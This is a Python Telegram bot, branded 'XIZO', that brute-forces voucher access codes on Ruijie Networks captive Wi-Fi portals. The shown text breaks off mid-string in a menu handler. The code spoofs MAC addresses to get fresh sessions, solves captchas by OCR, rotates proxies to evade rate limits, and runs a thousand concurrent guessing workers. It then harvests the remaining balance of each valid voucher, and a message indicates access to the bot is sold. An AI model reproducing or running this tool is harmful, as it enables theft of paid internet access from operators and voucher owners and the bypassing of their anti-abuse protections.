import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# SOCKS proxy support
from aiohttp_socks import ProxyConnector, ProxyType

# ---------------- CONFIGURATION ----------------
TIMEOUT_SEC = 30
MAX_CODES_PER_SID = 30
MAX_CODES_PER_SESSION = 30
NUM_WORKERS = 1000

# ⚠️ သင်၏ Telegram User ID ဖြင့် အစားထိုးပါ။
ADMIN_IDS = [bro id]

# Bot Token ကို ဤနေရာတွင် ထည့်ပါ
BOT_TOKEN = "bro bot token"

PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

# 🎯 Owner Name
OWNER_NAME = "bro user name"

# 🎨 XIZO Logo (Block Art)
XIZO_LOGO = (
    "██╗  ██╗██╗███████╗ ██████╗ \n"
    "╚██╗██╔╝██║╚══███╔╝██╔═══██╗\n"
    " ╚███╔╝ ██║  ███╔╝ ██║   ██║\n"
    " ██╔██╗ ██║ ███╔╝  ██║   ██║\n"
    "██╔╝ ██╗██║███████╗╚██████╔╝\n"
    "╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ "
)

# 🎨 XIZO Mini (inline)
XIZO_MINI = "✦ 𝐗 𝐈 𝐙 𝐎 ✦"


# ==================== PROXY MANAGER ====================
class ProxyManager:
    """proxies.txt ကနေ proxy တွေကို load လုပ်ပြီး latency အနည်းဆုံးကို ဦးစားပေးသုံးတယ်"""

    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies: list[str] = []
        self.bad_proxies: set[str] = set()
        self.latencies: dict[str, float] = {}
        self.proxy_usage: dict[str, int] = {}
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str) -> str | None:
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "http://" + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, "r") as f:
                    raw = [line.strip() for line in f if line.strip()]
                normalized = [self._normalize(r) for r in raw]
                self.proxies = list(dict.fromkeys([p for p in normalized if p]))
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.latencies.clear()
        self.proxy_usage.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} unique proxies")

    def reload(self):
        self.load()

    async def test_latency(self, proxy: str):
        try:
            connector = create_connector_for_proxy(proxy)
            timeout = aiohttp.ClientTimeout(total=5)
            start_time = time.time()
            async with aiohttp.ClientSession(connector=connector, connector_owner=True) as s:
                async with s.get("http://cp.cloudflare.com/generate_204", timeout=timeout) as resp:
                    if resp.status in [200, 204]:
                        latency = time.time() - start_time
                        self.latencies[proxy] = latency
                        return
        except Exception:
            pass
        self.latencies[proxy] = 999.0

    async def test_all_proxies(self):
        if not self.proxies:
            return
        print(f"[ProxyManager] Testing latency for {len(self.proxies)} proxies...")
        semaphore = asyncio.Semaphore(100)
        async def bounded_test(p):
            async with semaphore:
                await self.test_latency(p)
        tasks = [bounded_test(p) for p in self.proxies]
        await asyncio.gather(*tasks)
        self.proxies.sort(key=lambda p: self.latencies.get(p, 999.0))
        print(f"[ProxyManager] Latency test completed. Fastest: {self.proxies[0][:20]}...")

    async def get_next(self) -> str | None:
        async with self.lock:
            if not self.proxies:
                return None

            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]

            available.sort(key=lambda p: self.latencies.get(p, 999.0))

            top_n = min(len(available), 10)
            proxy = available[self.index % top_n]
            self.index += 1

            self.proxy_usage[proxy] = self.proxy_usage.get(proxy, 0) + 1
            return proxy

    async def release_proxy(self, proxy: str):
        async with self.lock:
            if proxy in self.proxy_usage:
                self.proxy_usage[proxy] -= 1
                if self.proxy_usage[proxy] <= 0:
                    del self.proxy_usage[proxy]

    async def mark_bad(self, proxy: str | None):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    def stats(self) -> tuple[int, int, int]:
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        active = total - bad
        in_use = len(self.proxy_usage)
        return total, active, in_use
# ==================== END PROXY MANAGER ====================

_proxy_manager: ProxyManager | None = None

def get_proxy_manager() -> ProxyManager:
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


# ---------------- GLOBALS for OCR ----------------
_ocr_instance = None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ---------------- PER-USER DATA ----------------
user_scanners = {}

def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {
                "tried": 0,
                "hits": 0,
                "expired": 0,
                "limits": 0,
                "start_time": time.time(),
            },
            "valid_codes": [],
            "limit_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "recheck_queue": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "last_tried": 0,
            "last_update_time": time.time(),
            "balance_queue": asyncio.Queue(),
            "worker_tasks": [],
            "scan_config": None,
        }
    return user_scanners[user_id]


# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None

async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return None, None
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query["mac"] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(
            spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False
        ) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(
                    final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False
                ) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None


# ---------------- CREATE CONNECTOR FROM PROXY STRING ----------------
def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)


# ---------------- PROXY SAVING & DEDUPLICATION ----------------
async def process_and_save_proxies(update: Update, new_lines: list, user_id: int):
    ud = get_user_data(user_id)

    existing_lines = []
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, "r") as f:
                existing_lines = [line.strip() for line in f if line.strip()]
        except Exception:
            pass

    combined = existing_lines + new_lines
    unique_lines = list(dict.fromkeys(combined))

    try:
        with open(PROXY_FILE, "w") as f:
            f.write("\n".join(unique_lines) + "\n")
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ဖိုင်ရေးရာတွင် အမှား ➜ {e}", parse_mode=ParseMode.MARKDOWN
        )
        return

    added_count = len(unique_lines) - len(existing_lines)

    pm = get_proxy_manager()
    pm.reload()

    await update.effective_message.reply_text(
        f"🔄 Proxy **{added_count}** ခု Latency စမ်းသပ်နေသည်...",
        parse_mode=ParseMode.MARKDOWN,
    )
    asyncio.create_task(pm.test_all_proxies())

    total, active, in_use = pm.stats()
    ud["state"] = None

    msg = await update.effective_message.reply_text(
        f"{XIZO_LOGO}\n"
        f"✅ 𝐏𝐑𝐎𝐗𝐘 𝐒𝐀𝐕𝐄𝐃\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"📦 Total    ›  `{total}`\n"
        f"💚 Active   ›  `{active}`\n"
        f"➕ Added    ›  `{added_count}`\n\n"
        f"🎲 Mode     ›  `{ud['mode']}`\n"
        f"🌐 Proxies  ›  `{active}/{total}`",
        reply_markup=get_main_menu_markup(),
        parse_mode=ParseMode.MARKDOWN,
    )
    ud["menu_msg_id"] = msg.message_id


# ---------------- BALANCE CHECKER (FULLY PROTECTED) ----------------
async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        connector = create_connector_for_proxy(proxy)
        timeout = aiohttp.ClientTimeout(total=30, connect=15)

        async with aiohttp.ClientSession(connector=connector, connector_owner=True) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status != 200:
                    return f"❌ HTTP {resp.status}"

                raw_text = await resp.text()
                if not raw_text.strip():
                    return "❌ Empty response"

                try:
                    data = json.loads(raw_text)
                except json.JSONDecodeError:
                    return "❌ Invalid JSON"

                inner = data.get("result", data)
                if not isinstance(inner, dict):
                    return f"❌ Format Error"

                profile_name = inner.get("profileName", "N/A")
                raw_total = inner.get("totalMinutes", 0)

                try:
                    total_minutes = abs(int(raw_total))
                except (ValueError, TypeError):
                    total_minutes = 0

                hours = total_minutes // 60
                minutes = total_minutes % 60

                return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"

    except asyncio.TimeoutError:
        return "❌ Timeout"
    except aiohttp.ClientPayloadError:
        return "❌ Net Error"
    except aiohttp.ClientError:
        return "❌ Conn Error"
    except Exception:
        return "❌ Error"


# ---------------- BALANCE WORKER ----------------
async def balance_worker(user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    while not ud["stop_event"].is_set():
        try:
            active_token, code = await asyncio.wait_for(ud["balance_queue"].get(), timeout=2.0)
        except asyncio.TimeoutError:
            continue

        balance_str = ""
        max_retries = 10

        for attempt in range(max_retries):
            if ud["stop_event"].is_set():
                break

            current_proxy = await pm.get_next()
            if not current_proxy:
                await asyncio.sleep(0.5)
                continue

            balance_str = await fetch_balance(active_token, code, current_proxy)
            await pm.release_proxy(current_proxy)

            if not balance_str.startswith("❌"):
                break

            await asyncio.sleep(0.5)

        for item in ud["valid_codes"]:
            if item["code"] == code:
                item["balance_str"] = balance_str
                break

        if not balance_str.startswith("❌"):
            ud["stats"]["hits"] += 1
            ud["recent_logs"].append(f"✅ HIT: {code} | {balance_str}")
        else:
            ud["recent_logs"].append(f"❌ Balance Fail: {code}")

        ud["dash_update_event"].set()
        ud["balance_queue"].task_done()


# ---------------- CHECK SINGLE ACCESS CODE ----------------
async def check_single_access_code(
    session,
    code,
    current_session_id,
    login_url,
    captcha_base_url,
    verify_url,
    headers,
    user_id,
    current_proxy,
):
    ud = get_user_data(user_id)
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    retry_count = 0
    while not ud["stop_event"].is_set():
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            await asyncio.sleep(0.01)
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(
                verify_url, json=v_payload, headers=headers, ssl=False
            ) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue

                l_payload = {
                    "accessCode": code,
                    "sessionId": current_session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                async with session.post(
                    login_url, json=l_payload, headers=headers, ssl=False
                ) as l_resp:
                    ud["stats"]["tried"] += 1
                    l_text = (await l_resp.text()).lower()

                    if "request limited" in l_text:
                        retry_count += 1
                        if retry_count < 5:
                            continue
                        else:
                            return "limit"

                    if '"success":true' in l_text:
                        already_exists = False
                        for item in ud["valid_codes"]:
                            if item["code"] == code:
                                already_exists = True
                                break

                        if not already_exists:
                            ud["valid_codes"].append(
                                {"code": code, "balance_str": "...fetching..."}
                            )
                            ud["dash_update_event"].set()

                            token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                            if token_match:
                                active_token = token_match.group(1)
                                await ud["balance_queue"].put((active_token, code))
                        return "hit"
                    elif "expired" in l_text:
                        ud["stats"]["expired"] += 1
                        return "expired"
                    elif (
                        "the number of sta exceeds the limit" in l_text
                        or "limit" in l_text
                    ):
                        ud["stats"]["limits"] += 1
                        if code not in ud["limit_codes"]:
                            ud["limit_codes"].append(code)
                        ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
                        return "limit"
                    return "failed"
        except Exception:
            return "failed"
    return "failed"


# ---------------- WORKER ----------------
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    while not ud["stop_event"].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue

        try:
            proxy_connector = create_connector_for_proxy(proxy)

            async with aiohttp.ClientSession(
                connector=proxy_connector, connector_owner=True
            ) as session:
                current_session_id = None
                codes_checked_this_sid = 0
                codes_checked_this_session = 0
                sid_failures = 0

                while (
                    not ud["stop_event"].is_set()
                    and codes_checked_this_session < MAX_CODES_PER_SESSION
                ):
                    if (
                        current_session_id is None
                        or codes_checked_this_sid >= MAX_CODES_PER_SID
                    ):
                        sid, mac = await get_sid_from_gateway(
                            session, ud["portal_url"], user_id
                        )
                        if sid is None:
                            sid_failures += 1
                            if sid_failures >= 3:
                                await asyncio.sleep(30)
                                break
                            await asyncio.sleep(1)
                            continue
                        current_session_id = sid
                        codes_checked_this_sid = 0
                        sid_failures = 0

                    while not ud["stop_event"].is_set():
                        if ud["mode"] == "custom" and ud["start_digit"] is not None:
                            body_chars = random.choices(
                                ud["char_set"], k=ud["code_len"] - 1
                            )
                            random.shuffle(body_chars)
                            code = ud["start_digit"] + "".join(body_chars)
                        else:
                            code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                        if code not in ud["tried_codes"]:
                            ud["tried_codes"].add(code)
                            break
                        await asyncio.sleep(0.001)

                    if ud["stop_event"].is_set():
                        break

                    ud["CURRENT_CODE"] = code
                    result = await check_single_access_code(
                        session,
                        code,
                        current_session_id,
                        login_url,
                        captcha_base_url,
                        verify_url,
                        headers,
                        user_id,
                        proxy,
                    )
                    codes_checked_this_sid += 1
                    codes_checked_this_session += 1
        finally:
            await pm.release_proxy(proxy)


# ---------------- LIVE DASHBOARD ----------------
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    ud["last_tried"] = 0
    ud["last_update_time"] = time.time()

    while not ud["stop_event"].is_set():
        if ud["dash_msg_id"] is None:
            await asyncio.sleep(0.5)
            continue
        try:
            stats = ud["stats"]
            current_time = time.time()
            elapsed = current_time - stats["start_time"]

            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
            delta_time = current_time - ud["last_update_time"]
            delta_tried = stats["tried"] - ud["last_tried"]

            if delta_time > 0:
                now_speed = (delta_tried / delta_time) * 60
            else:
                now_speed = 0

            ud["last_update_time"] = current_time
            ud["last_tried"] = stats["tried"]

            proxy_total, proxy_active, proxy_in_use = pm.stats()
            fetching_count = sum(1 for item in ud["valid_codes"] if item.get("balance_str") == "...fetching...")
            current_workers = len(ud["worker_tasks"])

            hit_list = []
            for item in ud["valid_codes"]:
                c = item["code"]
                balance = item.get("balance_str", "...fetching...")
                hit_list.append(f"  🎁 {c}  »  {balance}")
            hit_str = "\n".join(hit_list) if hit_list else "  ▸ မရှိသေးပါ"

            text = (
                f"{XIZO_LOGO}\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"🟢 𝐒𝐂𝐀𝐍𝐍𝐄𝐑 𝐀𝐂𝐓𝐈𝐕𝐄\n"
                f"👑 Owner    ›  {OWNER_NAME}\n"
                f"🎲 Mode     ›  {ud['mode']}\n\n"
                f"▬▬▬ 🎯 𝐑𝐄𝐀𝐋𝐓𝐈𝐌𝐄 ▬▬▬\n"
                f"⏱  Tried    ›  {stats['tried']}\n"
                f"🔍 Current  ›  {ud['CURRENT_CODE']}\n"
                f"💎 Hits     ›  {stats['hits']}\n"
                f"📥 Fetching ›  {fetching_count}\n"
                f"⏰ Expired  ›  {stats['expired']}\n"
                f"🚫 Limits   ›  {stats['limits']}\n\n"
                f"▬▬▬ ⚡ 𝐏𝐄𝐑𝐅𝐎𝐑𝐌 ▬▬▬\n"
                f"🚀 Avg Rate ›  {speed_cpm:.1f} c/m\n"
                f"🔥 Live     ›  {now_speed:.1f} c/m\n"
                f"🌐 Proxies  ›  {proxy_in_use}/{proxy_total}\n"
                f"👷 Workers  ›  {current_workers}\n\n"
                f"▬▬▬ 🏆 𝐇𝐈𝐓 𝐋𝐈𝐒𝐓 ▬▬▬\n"
                f"{hit_str}"
            )

            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(text="➕ 100", callback_data="add_100"),
                    InlineKeyboardButton(text="➖ 100", callback_data="sub_100")
                ],
                [
                    InlineKeyboardButton(text="➕ 500", callback_data="add_500"),
                    InlineKeyboardButton(text="➖ 500", callback_data="sub_500")
                ],
                [
                    InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")
                ]
            ])

            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass

        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
            ud["dash_update_event"].clear()
        except asyncio.TimeoutError:
            pass


# ---------------- START SCANNER ----------------
async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    ud["scan_config"] = {
        "login_url": "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US",
        "captcha_base_url": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "verify_url": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://portal-as.ruijienetworks.com",
            "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
        }
    }

    ud["dash_update_event"].clear()

    asyncio.create_task(live_dashboard_updater(context, user_id))

    for _ in range(100):
        asyncio.create_task(balance_worker(user_id))

    ud["worker_tasks"] = []
    for i in range(NUM_WORKERS):
        task = asyncio.create_task(worker(i, **ud["scan_config"], user_id=user_id))
        ud["worker_tasks"].append(task)

    ud["task"] = asyncio.current_task()

    try:
        while not ud["stop_event"].is_set():
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass
    finally:
        for t in ud["worker_tasks"]:
            if not t.done():
                t.cancel()
        ud["worker_tasks"] = []

        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0

        proxy_total, proxy_active, proxy_in_use = pm.stats()

        hit_list = []
        for item in ud["valid_codes"]:
            c = item["code"]
            balance = item.get("balance_str", "...fetching...")
            hit_list.append(f"  🎁 {c}  »  {balance}")
        hit_str = "\n".join(hit_list) if hit_list else "  ▸ မရှိပါ"

        final_text = (
            f"{XIZO_LOGO}\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"🔴 𝐒𝐂𝐀𝐍𝐍𝐄𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
            f"👑 Owner    ›  {OWNER_NAME}\n\n"
            f"▬▬▬ 📊 𝐅𝐈𝐍𝐀𝐋 𝐒𝐓𝐀𝐓𝐒 ▬▬▬\n"
            f"⏱  Tried    ›  {stats['tried']}\n"
            f"💎 Hits     ›  {stats['hits']}\n"
            f"⏰ Expired  ›  {stats['expired']}\n"
            f"🚫 Limits   ›  {stats['limits']}\n"
            f"🚀 Avg Rate ›  {speed_cpm:.1f} c/m\n"
            f"🌐 Proxies  ›  {proxy_in_use}/{proxy_total}\n\n"
            f"▬▬▬ 🏆 𝐀𝐋𝐋 𝐇𝐈𝐓𝐒 ▬▬▬\n"
            f"{hit_str}"
        )

        back_keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton(text="⬅️ Back to Menu", callback_data="btn_back_main")]]
        )

        if ud["dash_msg_id"]:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id,
                    message_id=ud["dash_msg_id"],
                    text=final_text,
                    reply_markup=back_keyboard,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

        ud["stop_event"].clear()
        ud["dash_msg_id"] = None
        ud["task"] = None


# ---------------- KEYBOARDS & HANDLERS ----------------
def get_main_menu_markup():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="🌐 Update Portal", callback_data="btn_update_portal"
                )
            ],
            [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu")],
            [
                InlineKeyboardButton(
                    text="➕ Add Proxies", callback_data="btn_add_proxies"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🚀 Start Scanner", callback_data="btn_start_scanner"
                )
            ],
        ]
    )


def admin_only(func):
    async def wrapper(
        update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs
    ):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            if update.effective_message:
                await update.effective_message.reply_text(
                    f"{XIZO_MINI}\n"
                    f"⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃\n"
                    f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                    f"👤 ဤ Bot ကို အသုံးပြုခွင့် မရှိပါ။\n"
                    f"🛒 ဝယ်ယူရန် ➜ {OWNER_NAME} 👊",
                    parse_mode=ParseMode.MARKDOWN,
                )
            return
        return await func(update, context, *args, **kwargs)

    return wrapper


@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = None

    pm = get_proxy_manager()
    proxy_total, proxy_active, proxy_in_use = pm.stats()

    msg = await update.message.reply_text(
        f"{XIZO_LOGO}\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"👑 Owner    ›  {OWNER_NAME}\n"
        f"🎲 Mode     ›  `{ud['mode']}`\n"
        f"🌐 Proxies  ›  `{proxy_active}/{proxy_total}`\n\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"👇 အောက်ပါ Menu မှ ရွေးချယ်ပါ",
        reply_markup=get_main_menu_markup(),
        parse_mode=ParseMode.MARKDOWN,
    )
    ud["menu_msg_id"] = msg.message_id


@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = "waiting_for_proxy_text"
    ud["menu_msg_id"] = update.effective_message.message_id
    await update.message.reply_text(
        f"{XIZO_MINI}\n"
        f"📥 𝐏𝐑𝐎𝐗𝐘 𝐈𝐍𝐏𝐔𝐓\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"Proxy များကို ယခုပို့ပါ -\n"
        f"▸ စာသား (Text) ဖြင့်\n"
        f"▸ `.txt` ဖိုင်ဖြင့်\n\n"
        f"🤖 ထပ်နေသော Proxy များ အလိုအလျောက် ဖယ်ရှားပါမည်။",
        parse_mode=ParseMode.MARKDOWN,
    )


@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.edit_text(
            f"{XIZO_MINI}\n"
            f"🌐 𝐏𝐎𝐑𝐓𝐀𝐋 𝐔𝐑𝐋\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"သင့် Portal URL ကို ပို့ပေးပါ။\n"
            f"▸ `http://` သို့မဟုတ် `https://` ဖြင့် စတင်ရပါမည်။",
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="🔢 Number 6", callback_data="set_mode_num6"),
                    InlineKeyboardButton(text="🔢 Number 7", callback_data="set_mode_num7"),
                    InlineKeyboardButton(text="🔢 Number 8", callback_data="set_mode_num8"),
                ],
                [
                    InlineKeyboardButton(text="🔢 Number 9", callback_data="set_mode_num9")
                ],
                [
                    InlineKeyboardButton(text="🔤 Abc 6", callback_data="set_mode_abc6"),
                    InlineKeyboardButton(text="🔤 Abc 7", callback_data="set_mode_abc7"),
                    InlineKeyboardButton(text="🔤 Abc 8", callback_data="set_mode_abc8"),
                    InlineKeyboardButton(text="🔤 Abc 9", callback_data="set_mode_abc9"),
                ],
                [
                    InlineKeyboardButton(text="🔀 Mix 6", callback_data="set_mode_mix6"),
                    InlineKeyboardButton(text="🔀 Mix 7", callback_data="set_mode_mix7"),
                    InlineKeyboardButton(text="🔀 Mix 8", callback_data="set_mode_mix8"),
                    InlineKeyboardButton(text="🔀 Mix 9", callback_data="set_mode_mix9"),
                ],
                [
                    InlineKeyboardButton(
                        text="🎯 Custom Start", callback_data="set_mode_custom"
                    )
                ],
                [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")],
            ]
        )
        await query.message.edit_text(
            f"{XIZO_MINI}\n"
            f"⚙️ 𝐌𝐎𝐃𝐄 𝐒𝐄𝐋𝐄𝐂𝐓𝐎𝐑\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👇 သင့် Mode ကို ရွေးချယ်ပါ",
            reply_markup=keyboard,
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud["mode"] = "num6"
            ud["char_set"] = "012345678"
            ud["code_len"] = 6
            ud["start_digit"] = None
        elif selected_mode == "num7":
            ud["mode"] = "num7"
            ud["char_set"] = "012345678"
            ud["code_len"] = 7
            ud["start_digit"] = None
        elif selected_mode == "num8":
            ud["mode"] = "num8"
            ud["char_set"] = "012345678"
            ud["code_len"] = 8
            ud["start_digit"] = None
        elif selected_mode == "num9":
            ud["mode"] = "num9"
            ud["char_set"] = "012345678"
            ud["code_len"] = 9
            ud["start_digit"] = None
        elif selected_mode in ["abc6", "abc7", "abc8", "abc9"]:
            ud["mode"] = selected_mode
            ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = int(selected_mode[-1])
            ud["start_digit"] = None
        elif selected_mode == "mix6":
            ud["mode"] = "mix6"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 6
            ud["start_digit"] = None
        elif selected_mode == "mix7":
            ud["mode"] = "mix7"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 7
            ud["start_digit"] = None
        elif selected_mode == "mix8":
            ud["mode"] = "mix8"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 8
            ud["start_digit"] = None
        elif selected_mode == "mix9":
            ud["mode"] = "mix9"
            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud["code_len"] = 9
            ud["start_digit"] = None
        elif selected_mode == "custom":
            ud["mode"] = "custom"
            ud["char_set"] = "012345678"
            ud["code_len"] = 6
            ud["state"] = "waiting_for_digit"
            ud["menu_msg_id"] = query.message.message_id
            await query.message.edit_text(
                f"{XIZO_MINI}\n"
                f"🎯 𝐂𝐔𝐒𝐓𝐎𝐌 𝐒𝐓𝐀𝐑𝐓\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
